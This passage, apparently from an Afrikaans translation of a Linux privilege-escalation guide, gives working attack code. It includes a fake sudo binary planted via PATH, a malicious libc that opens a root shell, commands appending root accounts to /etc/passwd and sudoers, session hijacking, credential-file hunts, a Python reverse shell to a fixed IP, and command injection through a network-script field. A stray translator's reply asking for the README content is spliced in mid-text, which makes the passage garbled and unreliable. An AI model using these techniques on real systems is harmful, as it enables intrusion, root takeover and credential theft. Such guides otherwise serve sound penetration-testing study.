Indien jy weet dat 'n **user gewoonlik op 'n masjien inlog en `sudo` gebruik** om privileges te eskaleer en jy 'n shell binne daardie user-konteks gekry het, kan jy **create a new sudo executable** wat jou kode as root en daarna die user se command sal uitvoer. Daarna, **modify the $PATH** van die user-konteks (byvoorbeeld deur die nuwe pad in .bash_profile by te voeg) sodat wanneer die user sudo uitvoer, jou sudo executable uitgevoer word.

Let op dat as die user 'n ander shell gebruik (nie bash nie) jy ander files sal moet wysig om die nuwe pad by te voeg. Byvoorbeeld [sudo-piggyback](https://github.com/APTy/sudo-piggyback) verander `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. 'n Ander voorbeeld vind jy in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of deur iets soos die volgende te hardloop:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waarvandaan die gelaaide konfigurasielêers afkomstig is**. Gewoonlik bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **biblioteke** gesoek gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel binne `/usr/local/lib` na biblioteke sal soek**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Kyk na **how to exploit this misconfiguration** op die volgende bladsy:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos in die `RPATH`-veranderlike gespesifiseer.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan 'n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Vermoëns

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Gidspermissies

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gee** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs vanaf die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Verborge ACL backdoor op sudoers drop-ins

’n Algemene miskonfigurasie is ’n lêer wat aan root behoort in `/etc/sudoers.d/` met modus `440` wat steeds skryftoegang aan ’n low-priv gebruiker deur ACL verleen.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
As jy iets sien soos `user:alice:rw-`, kan die gebruiker 'n sudo-reël byvoeg ondanks beperkende mode-bits:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Dit is 'n hoë-impak ACL persistence/privesc pad omdat dit maklik gemis word in `ls -l`-slegs hersienings.

## Oop shell sessions

In **ou weergawes** kan jy dalk **hijack** 'n **shell** session van 'n ander gebruiker (**root**).\
In **nuutste weergawes** sal jy slegs na screen sessions van **jou eie gebruiker** kan **connect**. Tog kan jy **interessante inligting binne die session** vind.

### screen sessions hijacking

**Lys screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Koppel aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dit was ’n probleem met **ou tmux-weergawes**. Ek kon nie ’n tmux (v2.1) sessie wat deur root geskep is, as ’n nie-geprivilegieerde gebruiker hijack nie.

**Lys tmux-sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine box from HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- en SSH-sleutels wat op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) tussen September 2006 en 13 Mei 2008 gegenereer is, kan deur hierdie fout geraak wees.\
Hierdie fout ontstaan wanneer 'n nuwe ssh-sleutel in daardie OS geskep word, omdat **slegs 32,768 variasies moontlik was**. Dit beteken dat alle moontlikhede bereken kan word en **deur die ssh publieke sleutel te hê kan jy na die ooreenstemmende private sleutel soek**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Bepaal of wagwoordauthentisering toegelaat word. Die standaard is `no`.
- **PubkeyAuthentication:** Bepaal of publieke sleutel-authentisering toegelaat word. Die standaard is `yes`.
- **PermitEmptyPasswords**: Wanneer wagwoordauthentisering toegelaat word, bepaal dit of die bediener aanmeldings na rekeninge met leë wagwoordstringe toelaat. Die standaard is `no`.

### Login control files

Hierdie lêers beïnvloed wie kan aanmeld en hoe:

- **`/etc/nologin`**: indien teenwoordig, blokkeer nie-root aanmeldings en vertoon die boodskap.
- **`/etc/securetty`**: beperk waar root kan aanmeld (TTY allowlist).
- **`/etc/motd`**: boodskap na aanmelding (kan omgewing- of onderhoudsbesonderhede leak).

### PermitRootLogin

Bepaal of root met ssh kan aanmeld, standaard is `no`. Moontlike waardes:

- `yes`: root kan aanmeld met wagwoord en private sleutel
- `without-password` or `prohibit-password`: root kan slegs met 'n private sleutel aanmeld
- `forced-commands-only`: Root kan slegs aanmeld met 'n private sleutel en indien die commands-opsies gespesifiseer is
- `no` : nee

### AuthorizedKeysFile

Bepaal lêers wat die publieke sleutels bevat wat vir gebruikersauthentisering gebruik kan word. Dit kan tokens soos `%h` bevat, wat vervang sal word deur die tuisgids. **Jy kan absolute paaie aandui** (begin met `/`) of **relatiewe paaie vanaf die gebruiker se tuisgids**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer aanmeld met die **private** sleutel van die gebruiker "**testusername**" sal ssh die publieke sleutel van jou sleutel vergelyk met dié wat in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access` geleë is

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om **gebruik jou plaaslike SSH keys in plaas daarvan om keys te laat lê** (sonder passphrases!) op jou bediener te laat. Dit beteken dat jy via ssh **spring** **na 'n host** kan gaan en van daar **spring na 'n ander** **host** **terwyl jy** die **key** gebruik wat in jou **initial host** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` stel soos volg:
```
Host example.com
ForwardAgent yes
```
Neem kennis dat indien `Host` `*` is, elke keer wanneer die gebruiker na 'n ander masjien verbind, daardie gasheer toegang tot die sleutels sal hê (wat 'n sekuriteitsrisiko is).

Die lêer `/etc/ssh_config` kan hierdie opsies **oorstreep** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan ssh-agent forwarding **toelaat** of **weier** met die sleutelwoord `AllowAgentForwarding` (standaard is toelaat).

As jyvind dat Forward Agent in 'n omgewing gekonfigureer is, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om voorregte te eskaleer**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiel-lêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe shell begin**. Daarom, as jy enigeen van hulle kan **skryf of wysig, kan jy voorregte eskaleer**.
```bash
ls -l /etc/profile /etc/profile.d/
```
As 'n vreemde profielskrip gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd/Shadow-lêers

Afhangend van die OS kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam hê of daar kan 'n rugsteunkopie wees. Daarom word dit aanbeveel om **al die lêers te vind** en **te kontroleer of jy hulle kan lees** om te sien **of daar hashes** binne die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **password hashes** binne die `/etc/passwd` (of ekwivalent) lêer vind
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Eerstens, genereer 'n wagwoord met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ik het die README.md inhoud nie ontvang nie — stuur asseblief die inhoud van src/linux-hardening/privilege-escalation/README.md wat jy vertaal wil hê.

Ook bevestig asseblief of jy wil dat ek in die vertaalde dokument 'n voorbeeldopdrag insluit wat die gebruiker `hacker` skep en 'n gegenereerde wagwoord (byvoorbeeld met openssl of pwgen). As jy wil, genereer ek 'n veilige wagwoord en plaas dit in die dokument (ek sal dit binne 'n kodeblok wys).
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` opdrag gebruik met `hacker:hacker`

Alternatiewelik kan jy die volgende lyne gebruik om 'n dummy-gebruiker sonder 'n wagwoord by te voeg.\
WAARSKUWING: jy kan die huidige sekuriteit van die masjien verswak.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
LET WEL: Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, en ook is `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy kan **skryf in sommige sensitiewe lêers**. Byvoorbeeld, kan jy skryf na 'n **dienskonfigurasielêer**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat** bediener laat loop en jy die **Tomcat dienskonfigurasielêer binne /etc/systemd/,** kan wysig, dan kan jy die reëls wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer dat tomcat begin.

### Kontroleer vouers

Die volgende vouers kan rugsteun of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde ligging/Owned lêers
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die afgelope minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Verborge lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteunkopieë**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog 'n interessante hulpmiddel** wat jy hiervoor kan gebruik is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n open source-toepassing is wat gebruik word om baie wagwoorde wat op 'n plaaslike rekenaar vir Windows, Linux & Mac gestoor is uit te haal.

### Logs

As jy Logs kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die log is, hoe meer interessant sal dit waarskynlik wees (waarskynlik).\
Ook kan sommige "**sleg**" geconfigureerde (backdoored?) **audit logs** jou toelaat om wagwoorde binne audit logs te **registreer** soos in hierdie pos verduidelik: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om logs te lees, sal die groep [**adm**](interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell-lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generiese Creds Soektog/Regex

Jy moet ook kyk na lêers wat die woord "**password**" in hul **naam** of binne die **inhoud** bevat, en kyk ook na IPs en emails in logs, of regexps vir hashes.\
Ek gaan nie hier lys hoe om al hierdie dinge te doen nie, maar as jy geïnteresseerd is kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform nagaan.

## Skryfbare lêers

### Python library hijacking

As jy weet **waar** 'n python script uitgevoer gaan word en jy **kan binne** daardie gids skryf of jy kan **modify python libraries**, kan jy die OS library wysig en backdoor dit (as jy daar kan skryf waar python script uitgevoer gaan word, kopieer en plak die os.py library).

Om die **backdoor the library** te doen, voeg net die volgende reël aan die einde van die os.py library by (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

'n kwesbaarheid in `logrotate` laat gebruikers met **skryfregte** op 'n loglêer of op sy ouergidse moontlik verhoogde bevoegdhede verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om willekeurige lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om permisies nie net in _/var/log_ na te gaan nie, maar ook in enige gids waar logrotasie toegepas word.

> [!TIP]
> Hierdie kwesbaarheid beïnvloed `logrotate` weergawe `3.18.0` en ouer

Meer gedetailleerde inligting oor die kwesbaarheid is op hierdie bladsy te vinde: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** daarom, wanneer jy vind dat jy loglêers kan verander, kontroleer wie daardie loglêers bestuur en kyk of jy bevoegdhede kan verhoog deur die loglêers met symlinks te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwesbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Indien, om watter rede ook al, 'n gebruiker in staat is om 'n `ifcf-<whatever>`-skrip in _/etc/sysconfig/network-scripts_ te **skryf** of 'n bestaande een te **aanpas**, dan is jou **system is pwned**.

Netwerk-skripte, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindinge. Hulle lyk presies soos .INI-lêers. Hulle word egter ~sourced~ op Linux deur Network Manager (dispatcher.d).

In my geval word die `NAME=` attribuut in hierdie netwerk-skripte nie korrek hanteer nie. As jy **wit/spasie in die naam het die stelsel probeer om die gedeelte ná die wit/spasie uit te voer**. Dit beteken dat **alles ná die eerste spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let op die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` huisves **scripts** vir System V init (SysVinit), die **klassieke Linux service management system**. Dit sluit scripts in om `start`, `stop`, `restart`, en soms `reload` dienste te bestuur. Hierdie kan direk uitgevoer word of via symboliese skakels in `/etc/rc?.d/`. 'n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant is `/etc/init` geassosieer met **Upstart**, 'n nuwer **service management** wat deur Ubuntu ingevoer is en wat konfigurasielêers vir diensbestuur gebruik. Ten spyte van die oorskakeling na Upstart, word SysVinit-scripts steeds saam met Upstart-konfigurasies gebruik weens 'n kompatibiliteitslaag in Upstart.

**systemd** ontstaan as 'n moderne initialization- en service-manager en bied gevorderde funksies soos on-demand daemon-begin, automount-bestuur en stelseltoestand-snapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir distribusiepakkette en `/etc/systemd/system/` vir administrateur-wysigings, wat stelseladministrasie vereenvoudig.

## Ander Wenke

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ontsnap uit beperkte Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks koppel gewoonlik 'n syscall om bevoorregte kernel-funksionaliteit aan 'n userspace manager bloot te lê. Swakke manager-authenticatie (bv., signature checks gebaseer op FD-order of swak wagwoordskemas) kan 'n plaaslike app toelaat om die manager na te boots en op reeds-geroote toestelle na root te eskaleer. Lees meer en sien eksploitasiemodele hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gedrewe service discovery in VMware Tools/Aria Operations kan 'n binêre pad uit proses command lines onttrek en dit met -v onder 'n bevoorregte konteks uitvoer. Permissiewe patrone (bv., die gebruik van \S) kan aanvallers-geïnstrumenteerde listeners in skryfbare plekke (bv., /tmp/httpd) match, wat tot uitvoering as root kan lei (CWE-426 Untrusted Search Path).

Lees meer en sien 'n gegeneraliseerde patroon wat op ander discovery/monitoring stacks van toepassing is hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Sekuriteitsbeskerming

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Beste instrument om na Linux local privilege escalation vectors te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumereer kernel-kwetsbaarhede in Linux en macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
